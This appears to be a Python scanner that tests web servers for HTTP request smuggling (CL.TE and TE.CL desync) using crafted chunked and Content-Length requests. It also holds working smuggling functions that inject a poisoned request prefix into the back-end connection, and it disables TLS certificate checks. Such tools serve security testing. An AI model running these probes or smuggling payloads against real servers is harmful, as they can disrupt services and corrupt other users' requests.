#!/usr/bin/python3
#
# Check if a URL is vulnerable to HTTP desync through HTTP request smuggling.
#

import argparse
import logging
import collections
import socket
import ssl
import urllib.parse

import transfer_encodings


TIMEOUT = 5


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('url')
    parser.add_argument('-v', '--verbose',
                        action='count', default=0,
                        help='increase output verbosity')
    args = parser.parse_args()

    # Configure logging
    if args.verbose == 0:
        level = logging.WARNING
    elif args.verbose == 1:
        level = logging.INFO
    else:
        level = logging.DEBUG
    logging.basicConfig(format='[%(levelname)s] %(message)s', level=level)

    return parser.parse_args()


def parse_url(url):
    '''Return the components of an http or https URL

    A named tuple is returned:
    - scheme: 'http' or 'https'
    - host: hostname (or IPv4/IPv6 address)
    - port
    - path: full path including any query or fragment

    A normalized URL can be formed as: scheme://host:port/path
    '''
    ParsedUrl = collections.namedtuple('ParsedURL',
                                       ['scheme', 'host', 'port', 'path'])
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    s = urllib.parse.urlsplit(url, scheme='http', allow_fragments=False)
    scheme = s.scheme
    host = s.hostname if s.hostname else s.netloc
    if s.port:
        port = s.port
    elif scheme == 'http':
        port = 80
    elif scheme == 'https':
        port = 443
    path = s.path if s.path else '/'
    if s.query:
        path += '?' + s.query
    return ParsedUrl(scheme, host, port, path)


def connect(target):
    '''Connect to a target as returned by parse_url()'''
    ai = socket.getaddrinfo(target.host, target.port,
                            type=socket.SOCK_STREAM,
                            proto=socket.IPPROTO_TCP)[0]
    sock = socket.socket(ai[0], ai[1], ai[2])
    sock.settimeout(TIMEOUT)
    if target.scheme == 'https':
        context = ssl.create_default_context()
        #context = ssl.create_default_context(cafile='/home/nicolas/tmp/meshify.crt')
        # Don't verify server certificates
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        s = context.wrap_socket(sock, server_hostname=target.host)
    else:
        s = sock
    s.connect(ai[4])
    logging.debug(f'Connected to {ai[4][0]} port {ai[4][1]}')
    return s


def to_http(s):
    return s.replace('\n', '\r\n').encode('ascii')


def query(target, payload):
    s = connect(target)
    logging.debug(f'>>> {target.host}:{target.port}\n' + payload)
    s.sendall(payload.encode())
    response = s.recv(4096)
    logging.debug(f'<<< {target.host}:{target.port}\n' + response.decode())
    s.shutdown(socket.SHUT_RDWR)
    s.close()


def is_vulnerable(target, te_header):
    vulnerable = ''
    url = f'{target.scheme}://{target.host}:{target.port}{target.path}'

    # Test vulnerability to CL.TE attack
    try:
        query(target, f'POST {target.path} HTTP/1.1\r\n'
                      f'Host: {target.host}:{target.port}\r\n'
                      f'{te_header}\r\n'
                       'Content-Length: 4\r\n'
                       '\r\n'
                       '1\r\n'
                       'Z\r\n'
                       'Q')
    except socket.timeout:
        vulnerable = 'CL.TE'
        logging.debug(f'{vulnerable} timeout on {url}')

    # If target is vulnerable to CL.TE desync then the TE.CL check will poison
    # the back-end socket with an 'X', potentially harming legitimate users.
    # So just return now.
    if vulnerable:
        return vulnerable

    # Test vulnerability to TE.CL attack
    try:
        query(target, f'POST {target.path} HTTP/1.1\r\n'
                      f'Host: {target.host}:{target.port}\r\n'
                      f'{te_header}\r\n'
                       'Content-Length: 6\r\n'
                       '\r\n'
                       '0\r\n'
                       '\r\n'
                       'X\r\n')
    except socket.timeout:
        vulnerable = 'TE.CL'
        logging.debug(f'{vulnerable} timeout on {url}')

    return vulnerable


def cl_te_smuggle(target, smuggle):
    cl = len(smuggle) + 5           # account for inserted zero-length chunk
    query(target, f'POST {target.path} HTTP/1.1\r\n'
                  f'Host: {target.host}:{target.port}\r\n'
                   'Transfer-Encoding: chunked\r\n'
                  f'Content-Length: {cl}\r\n'
                   '\r\n'
                   '0\r\n'          # insert zero-length chunk
                   '\r\n'
                   f'{smuggle}')


def te_cl_smuggle(target, smuggle):
    smuggle_len = f'{len(smuggle):x}'
    smuggle = (f'{smuggle}\r\n'     # add final zero-length chunk
                '0\r\n'
                '\r\n')
    cl = len(smuggle_len) + 2       # account for '\r\n'
    query(target, f'POST {target.path} HTTP/1.1\r\n'
                  f'Host: {target.host}:{target.port}\r\n'
                   'Transfer-Encoding: chunked\r\n'
                  f'Content-Length: {cl}\r\n'
                   '\r\n'
                  f'{smuggle_len}\r\n'
                  f'{smuggle}')


def main():
    args = parse_args()
    target = parse_url(args.url)
    url = f'{target.scheme}://{target.host}:{target.port}{target.path}'
    logging.debug(f'Normalized url: {url}')
    for te in transfer_encodings.te_values:
        r = is_vulnerable(target, te)
        if r:
            print(f'{r} with header {repr(te)}')
'''
    cl_te_smuggle(target, 'G')
    te_cl_smuggle(target, f'GPOST / HTTP/1.0\r\n'
                          f'Host: {target.host}:{target.port}\r\n'
                           'Content-Length: 50\r\n'
                           '\r\n')
'''


if __name__ == "__main__":
    main()
